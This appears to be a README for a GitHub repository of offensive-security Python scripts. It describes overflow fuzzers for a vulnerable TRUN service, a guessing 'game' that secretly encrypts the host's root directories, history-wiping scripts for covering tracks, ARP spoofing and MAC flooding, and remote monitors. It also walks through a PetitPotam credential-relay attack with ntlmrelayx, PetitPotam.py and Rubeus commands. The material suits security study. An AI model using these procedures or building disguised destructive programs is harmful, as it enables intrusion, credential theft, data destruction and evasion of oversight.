1. WIns_overflow.py - This script is designed to send a custom payload to a specified target over a TCP connection. It prompts the user for a pattern to be sent, the target's IPv4 address, and the target's TCP port. The script then attempts to create a socket connection to the target using the provided address and port. If the connection is successful, it sends the user-provided pattern as part of a 'TRUN /.:/' command. If any errors occur during this process, the script catches the exception, prints an error message, and exits with a non-zero status, indicating that an error has occurred. The improvements include ensuring the message is properly encoded, correctly closing the socket, and providing detailed error messages for better debugging. <br />
2. XtremeGame.py - This is an Extremely Silly Game, play at your own risks! <br />
3. XtremeGame2.py - The Extremely Silly Game 2 is a simple number guessing game that asks the user to guess a random number between 1 and 10. If the user's guess is correct, they win the game and a congratulatory message is displayed. If the user's guess is incorrect, they lose the game and a message is displayed indicating that they have lost. In the event of a loss, the game then proceeds to encrypt the root directories and all of their subdirectories and files on the host system using the AES encryption algorithm with a key derived from a predefined password and a salt value. This is done using the cryptography library in Python. The encryption process overwrites all files in the specified directories with their encrypted contents, effectively destroying the original data. It is important to note that this is a destructive and dangerous operation that should only be performed in a controlled and safe environment, as it can cause serious damage to the operating system and potentially render the system unusable. <br />
4. XtremeGui.py - This script is a simple number guessing game implemented in Python using the Tkinter library for the graphical user interface. The game generates a random number between 1 and 10 and prompts the user to guess the number. If the user's guess is correct, the game prints a congratulatory message. If the guess is incorrect, the game prints a message indicating that the user has lost and calls a function to encrypt the root directories and all its subdirectories and files using the cryptography library. The game can be started by clicking a "Start Game" button. The game also includes error handling to ensure that the user's input is valid before trying to convert it to an integer. <br />
5. WIns_OvrWrte.py - is a program that interacts with a network service by sending a custom payload to a specified target. It begins by prompting the user to input two characters and their corresponding multipliers, which are used to construct a pattern called `shellcode`. The script then asks for the target's IPv4 address and TCP port number. Using this information, it creates a TCP socket connection to the target and sends the payload. If the connection attempt fails or if any input errors occur, appropriate error messages are displayed, and the script exits with a non-zero status to indicate failure. The script includes improved readability, specific exception handling, and detailed inline comments to aid understanding. <br />
6. statrun.spk - This `.spk` script serves as a versatile tool for cyber applications, offering interactive functionality to check and process specific commands like "TRUN" or "STATS". It enables cybersecurity professionals to efficiently query and analyze critical system or network statistics ("STATS") or potentially vulnerable services ("TRUN"). By prompting for user input and responding accordingly, the script supports proactive monitoring, vulnerability assessments, and incident response tasks. Its structured approach allows for quick adaptation to different scenarios, enhancing cybersecurity operations by providing real-time insights and facilitating timely actions based on user-defined queries. Integrating this script into cybersecurity workflows enhances operational efficiency and responsiveness, making it a valuable asset in safeguarding digital environments against emerging threats and vulnerabilities. This is used for spiking. <br />
7. fuzzywuzzy.py - `fuzzywuzzy.py` is a Python script designed for network fuzzing, a technique used in cybersecurity testing to discover vulnerabilities in software by sending malformed or unexpected data inputs. The script begins by prompting the user to enter the IPv4 address and TCP port of the target server. It then establishes a TCP connection and repeatedly sends increasingly larger payloads of 'A' characters to the server's TRUN command endpoint. This process helps simulate various attack scenarios where unexpected input sizes might trigger software crashes or reveal security weaknesses. FuzzyWuzzy.py employs socket programming for network communication and incorporates robust error handling to detect and report crashes in the target server, enhancing its effectiveness in vulnerability assessment. <br />
8. sketchcharacters.py - The Python script facilitates network interaction by allowing users to input characters and multipliers, which are then combined into a shellcode pattern. This pattern includes a predefined list of bad characters commonly problematic in software exploitation. The script establishes a TCP connection with a specified IPv4 address and port, sending the constructed shellcode pattern as part of a payload to a target server. It employs robust error handling to manage potential issues such as socket errors or invalid user inputs, ensuring reliable execution and effective testing for vulnerability assessment in network environments. <br />
9. WIn_Jump.py - This script facilitates interaction with a remote network target using a socket connection. It prompts the user to input characters and multipliers to generate a shellcode pattern, which is then sent as a payload to the specified IPv4 address and TCP port. Error handling is implemented to manage socket errors, value errors (like invalid port numbers), and other unexpected exceptions, providing informative messages and exiting with a non-zero status upon encountering issues. The script is designed for network testing and potentially vulnerability assessment tasks. <br />
10. WIn_shellcode.py - This Python script facilitates the deployment of a Windows shellcode payload to a specified network target. It prompts the user to input characters, multipliers, architecture details in Little Endian format, and the generated shellcode obtained from a tool like `msfvenom`. Using socket programming, it establishes a TCP connection to the target IPv4 address and port, sending a crafted payload derived from user inputs. The script includes robust error handling for socket errors, value errors, and other exceptions, ensuring informative error messages and proper script termination upon encountering issues. <br />
11. tracksremover.sh - This Bash script is designed to securely delete the command history from the current user's shell session. It begins by using the `shred` command to overwrite the `.bash_history` file multiple times and then remove it, ensuring that the deleted data cannot be easily recovered. Following this, the script creates a new empty `.bash_history` file and clears the current session's history using the `history -c` command. Finally, it exits the shell. This sequence of commands ensures both the secure deletion of past command history and the prevention of any residual data from the current session, enhancing overall privacy and security. <br />
12. Wintrackrem.ps1 - The provided script aims to clear the command history in Windows terminals, whether using Command Prompt (CMD) or PowerShell. In CMD, the script deletes the command history file located at `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`, reinstalls the `doskey` utility to clear the current session's history, and then exits the terminal. This is achieved using the `del` and `doskey /reinstall` commands followed by `exit`. For PowerShell, the script removes the same history file using `Remove-Item`, then clears the current session's history by overwriting the file with an empty string using `[System.IO.File]::WriteAllText`, and finally exits the terminal with the `exit` command. Both scripts ensure that any previously entered commands are erased, maintaining privacy and security by removing traces of past activities in the terminal. <br />
13. MAC_Mirage.py - This script listens for ARP (Address Resolution Protocol) broadcast requests on the network and responds to them, regardless of the IP address requested. It uses the Scapy library to sniff ARP requests and then crafts ARP reply packets. The script associates any requested IP address with the MAC address of the machine running the script, effectively claiming ownership of that IP. This is done by sending a forged ARP reply back to the original requester. The script demonstrates ARP spoofing, often used in network attacks but can also be applied in ethical hacking scenarios with proper authorization. <br />
14. Switch_Faker.py - This script is for Linux systems that facilitates network testing by performing MAC address spoofing, network flooding, and packet sniffing. It allows users to change their network interface’s MAC address either by specifying a custom address or by generating a random one. After modifying the MAC address, the script floods the network with packets to simulate stress on the network. Following this, it sets the network interface to promiscuous mode to capture all traffic for a specified duration, saving the captured packets to a user-defined file. This script is designed for network analysis, enabling users to disrupt and monitor network traffic effectively. <br />

**Example outputs of some of the scripts!** <br />
1. XtremeGame.py and XtremeGame2.py outputs: <br />
Would you like to play a silly game? no <br />
Too bad... <br />
Welcome to the Extremely Silly Game! <br />
Please guess a number between 1 and 10: 3 <br />
Oh no..... <br />
You have lost the Extremely Silly Game... Goodbye! <br />
2. statrun.spk outputs: <br />
a. $ ./statrun.spk <br />
TRUN <br />
Checking TRUN... <br />
b. $ ./statrun.spk <br />
STATS <br />
Checking STATS... <br />
c. $ ./statrun.spk <br />
INVALID <br />
Invalid option. <br />
3. fuzzywuzzy.py output: <br />
Please enter the IPv4 address of the target: 192.168.1.100 <br />
Please enter the TCP port of the target: 9999 <br />
Fuzzing crashed vulnerable server at 1200 bytes <br />
4. MAC_Mirage.py output: <br />
Sent ARP reply: 192.168.1.5 is-at 00:11:22:33:44:55 <br />
Sent ARP reply: 192.168.1.10 is-at 00:11:22:33:44:55 <br />
Sent ARP reply: 192.168.1.12 is-at 00:11:22:33:44:55 <br />
Sent ARP reply: 192.168.1.7 is-at 00:11:22:33:44:55 <br />
5. Switch_Faker.py output: <br />
Enter the network interface (e.g., eth0, wlan0): wlan0 <br />
Current MAC address: 88:32:9b:c7:ab:12 <br />
Do you want to specify a MAC address? (yes/no): no <br />
Generated random MAC address: 00:16:3e:4d:87:9a <br />
Changing MAC address... <br />
MAC address successfully changed to: 00:16:3e:4d:87:9a <br />
6. FloodAndSwitch.py output: <br /> 
Enter the network interface (e.g., eth0, wlan0): eth0 <br />
Current MAC address: 00:11:22:33:44:55 <br />
Do you want to specify a MAC address? (yes/no): no <br />
Generated random MAC address: 00:16:3e:5a:6b:7c <br />
Changing MAC address of eth0 to 00:16:3e:5a:6b:7c... <br />
MAC address changed to: 00:16:3e:5a:6b:7c <br />
Enter the duration for flooding (in seconds): 10 <br />
Starting MAC flooding on interface eth0 with MAC address 00:16:3e:5a:6b:7c for 10 seconds... <br />
Flooding network with packet from: 00:16:3e:5a:6b:7c <br />
Flooding network with packet from: 00:16:3e:5a:6b:7c <br />
Flooding network with packet from: 00:16:3e:5a:6b:7c <br />
... <br />
MAC flooding completed. <br />
<br />
Setting promiscuous mode promisc for eth0... <br />
Promiscuous mode promisc for eth0. <br />
<br />
Enter the filename to save captured packets (e.g., captured_packets.pcap): my_packets.pcap <br />
Enter the duration for packet sniffing (in seconds): 15 <br />
Starting packet sniffing on interface eth0 for 15 seconds... <br />
Captured packet: Ethernet / IP / UDP 00:16:3e:5a:6b:7c > 00:22:33:44:55:66 192.168.1.5:12345 > 192.168.1.10:54321 <br />
Captured packet: Ethernet / IP / TCP 00:22:33:44:55:66 > 00:16:3e:5a:6b:7c 192.168.1.10:54321 > 192.168.1.5:12345 <br />
Captured packet: Ethernet / ARP 00:aa:bb:cc:dd:ee > ff:ff:ff:ff:ff:ff <br />
... <br />
Packet sniffing completed. Packets saved to 'my_packets.pcap'. <br />
<br />
Setting promiscuous mode nopromisc for eth0... <br />
Promiscuous mode nopromisc for eth0. <br />




# Hacky Hierarchy <br />
![image](https://github.com/FishyStix12/WHPython/assets/102126354/41065611-8c4a-4e78-8550-91478c6a7538) <br />
**Important Note: For these scripts to work install the appropriate libraries using the commands below:** <br />
pip install pywin32 wmi pyinstaller <br />
pip install psutil <br />

**Important note: Please visit http://timgolden.me.uk/python/win32_how_do_i/watch_directory_for_changes.html to help you learn how to use filetactician.py**

**Important Note: PetitPotam Hijacking Attack what is is and how to perform it!** <br />
`Description:` <br />
A PetitPotam hijacking attack is a type of security exploit that targets Windows systems, specifically leveraging the Microsoft EFSRPC (Encrypting File System Remote Protocol) to coerce a machine into authenticating to an attacker-controlled server. By sending specially crafted requests, an attacker can force a target to reveal its NTLM (NT LAN Manager) credentials, which can then be used to gain unauthorized access to sensitive resources. This attack is particularly concerning because it can be executed without prior access to the network, making it a stealthy vector for compromising systems and gaining elevated privileges. <br />
`Execution Steps:` <br />
1. Use the `certutil.exe` command to identify the certificate authority. <br />
2. Use the `ntlmrelayx.py -t <URL of Certificate authority with web enrolment> -smb2support --adcs --template DomainController` command from the Impacket tool kit to set up HTTP/SMB configuration to capture credentials from the Domain Controller. <br />
3c. Use the `python3 PetitPotam.py -d <CA name> -u <Username> -p <Password> <Listener-IP> <IP of DC>` command to force the authentification using the captured credentials through the MS-EFSRPC (Microsoft's Encrypting File System Remote Protocal) call. <br />
3b.If the DC is vulnerable the attack can be launched without credentials using the `python3 PetitPotam.py <Attacker’s IP> <IP of DC>` PetitPotam command to recieve the certificate's NTLM (New Technology LAN Manager) hashes. <br />
![image](https://github.com/user-attachments/assets/d6d124e3-fe65-468f-b757-2b5542d24c5f) <br />
`Username: User ID: LM Hash: NTLM Hash:::` <br />
4. Once you have obtained the NTLM hashes of the certificate, utilize password-cracking tools such as Rubeus, Hashcat, etc. `Example Rubeus command: Rubeus.exe asktgt /outfile.kirbi /dc:<DC-IP> /domain: domain name /user: <Domain username> /ptt /certificate: <NTLM hashes received from above command>` <br />
Command Breakdown: <br />
   a. Rubeus.exe: This is the executable file for the Rubeus tool, which allows for various Kerberos-related operations. <br />
   b. asktgt: This is a command within Rubeus that requests a Ticket Granting Ticket (TGT) from the Kerberos Key Distribution Center (KDC). This is often done to gain access to a domain. <br />
   c. /outfile.kirbi: This option specifies the output file where the obtained TGT will be saved. In this case, the file will be named outfile.kirbi. The .kirbi extension is commonly used for Kerberos tickets. <br />
   d. /dc:<DC-IP>: This option specifies the IP address of the Domain Controller (DC) that will be queried for the TGT. Replace <DC-IP> with the actual IP address of the target DC. <br />
   e. /domain: <domain name>: This specifies the domain for which you are requesting the TGT. You need to replace <domain name> with the actual name of the domain you want to access. <br />
   f. /user: <Domain username>: This option indicates the username of the domain account for which the TGT is being requested. Replace <Domain username> with the actual username. <br />
   g. /ptt: This flag stands for "Pass The Ticket." It indicates that if the TGT is successfully obtained, it should be loaded into the current session, allowing the user to authenticate without needing to re-enter credentials. <br />
   h. /certificate: <NTLM hashes received from above command>: This option specifies NTLM hashes that might be used for authenticating or acquiring the TGT. The placeholder <NTLM hashes received from above command> should be replaced with actual NTLM hashes that were obtained previously, typically from another command or tool. <br />
**For more information please visit the links below:** <br />
`1. Summary of vulnerability with mitigation techniques:` https://www.rapid7.com/blog/post/2021/08/03/petitpotam-novel-attack-chain-can-fully-compromise-windows-domains-running-ad-cs/ <br />
`2. Another summary of the vulnerability with a guideline on how to setup and conduct a practice lab:` https://medium.com/r3d-buck3t/domain-takeover-with-petitpotam-exploit-3900f89b38f7 <br />
`3. Practical usage of NTLM Hashes pth-toolkit and Impacket Guide:` https://blog.ropnop.com/practical-usage-of-ntlm-hashes/ <br />

**The Following List gives a short description of all the scripts in this group:** <br />
1. tasktactician.py - The script above is a process monitoring tool designed to run on both Windows and Linux platforms. It continuously tracks and logs information about newly created processes, including their command line, creation time, executable path, parent process ID, process ID, user, and privileges. The script allows users to input the target host's IP address and port, enabling remote monitoring of processes on a specified machine. Leveraging platform-specific APIs such as WMI for Windows and system commands like `ps` for Linux, the script provides a platform-agnostic solution for process monitoring. Additionally, it employs exception handling to ensure robustness and reliability in capturing process information. Overall, this versatile script offers a flexible and accessible means to monitor and analyze system activities across diverse computing environments. <br />
2. filetactician.py - The script is a versatile monitoring tool designed to observe file system activities either locally or on a remote host. It offers two modes of operation: "monitor" and "client". In "monitor" mode, it actively tracks file system changes within specified directories on the local machine using Windows-specific functionality. Meanwhile, in "client" mode, it connects to a remote host, allowing users to monitor activities on that machine by receiving and printing data transmitted from the remote host. This flexibility enables users to choose between monitoring their own system or observing the activities of a remote system, enhancing their ability to oversee and manage file operations across different environments. <br />

**Example outputs of some of the scripts!** <br />
1. tasktactian.py output: <br />
   CommandLine: /usr/bin/python3 script.py, Create Time: 2024-03-14 10:25:17, Executable: python3, Parent PID: 1234, PID: 5678, User: user1, Privileges: N/A <br />
   CommandLine: /usr/bin/gedit file.txt, Create Time: 2024-03-14 10:30:45, Executable: gedit, Parent PID: 5678, PID: 91011, User: user1, Privileges: N/A <br />
   CommandLine: C:\Windows\System32\notepad.exe file.txt, Create Time: 2024-03-14 11:15:32, Executable: notepad.exe, Parent PID: 12345, PID: 121314, User: user2, Privileges: SeDebugPrivilege|SeAssignPrimaryTokenPrivilege| <br />
2. filetactician.py output: <br />
   In Monitor Mode: <br />
   Choose mode (monitor/client): monitor <br /> 
   [+] Created c:\WINDOWS\Temp\example.txt <br />
   [\*] Modified c:\WINDOWS\Temp\example.txt <br />
   [vvv] Dumping contents ... <br />
   This is an example file. <br />
   [^^^] Dump Complete. <br />
   [+] Copied c:\WINDOWS\Temp\example.txt <br />
   [+] Pasted c:\WINDOWS\Temp\example_copy.txt <br />
   [-] Deleted c:\WINDOWS\Temp\example_copy.txt <br />


# Cyber Sherlock: Investigating Digital Misdeeds <br />
![image](https://github.com/FishyStix12/WHPython/assets/102126354/78679002-4467-48aa-b43d-72e6e3228d8f) <br />
**Important Note: Please run the script below to setup the Volatility Python Framework:** <br />
1. volat_conf.sh - This Bash script automates the configuration process for the Volatility Python framework, a powerful tool used for memory forensics analysis. When executed, the script first checks for the presence of essential dependencies such as Git, Python 3, and pip. If any of these dependencies are missing, the script prompts the user to install them. Next, it installs necessary system dependencies and clones the Volatility repository from GitHub. After cloning the repository, the script navigates into the Volatility directory and installs the required Python dependencies using pip. Finally, it displays a completion message indicating that the Volatility configuration is complete. To use the script, simply save it to a file (e.g., `configure_volatility.sh`), make it executable using the command `chmod +x configure_volatility.sh`, and then execute it using `./configure_volatility.sh`. Then visit https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet to learn about the Volatibility tool. Please note, I did not create the Volatility Python framework only this automation script to automatically set up the framework in your host Linux Environment. <br />
